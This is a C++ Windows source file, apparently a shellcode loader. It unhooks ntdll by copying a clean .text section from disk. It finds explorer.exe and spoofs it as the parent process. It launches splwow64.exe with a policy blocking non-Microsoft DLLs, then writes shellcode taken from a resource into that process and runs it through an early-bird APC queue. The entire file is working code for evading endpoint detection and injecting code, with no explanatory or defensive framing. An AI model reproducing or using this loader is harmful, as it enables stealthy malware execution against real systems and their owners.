#include "..\public.hpp"
#include <psapi.h>
#include "ntdll.h"

#pragma comment(lib, "ntdll")

DWORD UNHOOKntdll()
{
    MODULEINFO mi = {};
    HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");

    GetModuleInformation(HANDLE(-1), ntdllModule, &mi, sizeof(mi));
    LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
    HANDLE ntdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);

    PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

    for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++)
    {
        PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text"))
        {
            DWORD oldProtection = 0;
            bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
            memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
            isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
        }
    }

    CloseHandle(ntdllFile);
    CloseHandle(ntdllMapping);
    FreeLibrary(ntdllModule);

    return 0;
}

DWORD FindProcessId()
{
    UNHOOKntdll();
    DWORD processId = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (snapshot != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 processEntry;
        processEntry.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(snapshot, &processEntry))
        {
            do
            {
                if (_wcsicmp(processEntry.szExeFile, L"explorer.exe") == 0)
                {
                    processId = processEntry.th32ProcessID;
                    break;
                }
            } while (Process32Next(snapshot, &processEntry));
        }

        CloseHandle(snapshot);
    }

    return processId;
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR  lpCmdLine, _In_ int  nCmdShow)
{
	UINT shellcodeSize = 0;
	unsigned char *shellcode = GetShellcodeFromRes(100, shellcodeSize);
	if (shellcode == nullptr)
	{
		return 0;
	}

    UNICODE_STRING NtImagePath, CurrentDirectory, CommandLine;
    RtlInitUnicodeString(&NtImagePath, (PWSTR)L"\\??\\C:\\Windows\\splwow64.exe");
    RtlInitUnicodeString(&CurrentDirectory, (PWSTR)L"C:\\Windows");
    RtlInitUnicodeString(&CommandLine, (PWSTR)L"\"C:\\Windows\\splwow64.exe\"");

    PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
    RtlCreateProcessParametersEx(&ProcessParameters, &NtImagePath, NULL, &CurrentDirectory, &CommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);

    PS_CREATE_INFO CreateInfo = { 0 };
    CreateInfo.Size = sizeof(CreateInfo);
    CreateInfo.State = PsCreateInitialState;

    PPS_ATTRIBUTE_LIST AttributeList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE) * 3);
    AttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST);

    AttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    AttributeList->Attributes[0].Size = NtImagePath.Length;
    AttributeList->Attributes[0].Value = (ULONG_PTR)NtImagePath.Buffer;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, 0, 0, 0, 0);

    CLIENT_ID cid = { (HANDLE)FindProcessId(), NULL };

    HANDLE hParent = NULL;
    NtOpenProcess(&hParent, PROCESS_ALL_ACCESS, &oa, &cid);

    AttributeList->Attributes[1].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
    AttributeList->Attributes[1].Size = sizeof(HANDLE);
    AttributeList->Attributes[1].ValuePtr = hParent;

    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

    AttributeList->Attributes[2].Attribute = PS_ATTRIBUTE_MITIGATION_OPTIONS;
    AttributeList->Attributes[2].Size = sizeof(DWORD64);
    AttributeList->Attributes[2].ValuePtr = &policy;

    HANDLE hProcess, hThread = NULL;
    NtCreateUserProcess(&hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, ProcessParameters, &CreateInfo, AttributeList);

    PVOID lpBaseAddress = NULL;
    SIZE_T sDataSize = shellcodeSize;
    NtAllocateVirtualMemory(hProcess, &lpBaseAddress, 0, &sDataSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    //lpBaseAddress = (LPVOID)VirtualAllocEx(hProcess, NULL, sDataSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    NtWriteVirtualMemory(hProcess, lpBaseAddress, (PVOID)shellcode, sDataSize, NULL);
    //WriteProcessMemory(hProcess, lpBaseAddress, (LPVOID)shellcode, shellcodeSize, NULL);

    ULONG ulOldProtect = 0;
    NtProtectVirtualMemory(hProcess, &lpBaseAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);

    NtQueueApcThread(hThread, (PPS_APC_ROUTINE)lpBaseAddress, NULL, NULL, NULL);
    //QueueUserAPC((PAPCFUNC)lpBaseAddress, hThread, NULL);

    NtResumeThread(hThread, NULL);
    //ResumeThread(hThread);

    CloseHandle(hThread);
	return 0;
}